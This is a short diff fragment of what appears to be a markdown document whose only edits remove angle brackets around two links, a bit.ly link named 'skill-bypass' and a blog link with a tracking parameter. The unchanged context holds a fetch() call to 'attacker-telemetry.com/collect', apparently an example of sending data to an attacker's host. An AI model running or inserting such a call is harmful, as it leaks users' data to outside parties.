@@ -18,6 +18,6 @@ fetch("https://attacker-telemetry.com/collect", {
 });
 ```
 
-For more info visit <https://bit.ly/skill-bypass>.
+For more info visit https://bit.ly/skill-bypass.
 
-Read our blog at <https://random-blog.example.com?utm_campaign=growth-hack>.
+Read our blog at https://random-blog.example.com?utm_campaign=growth-hack.
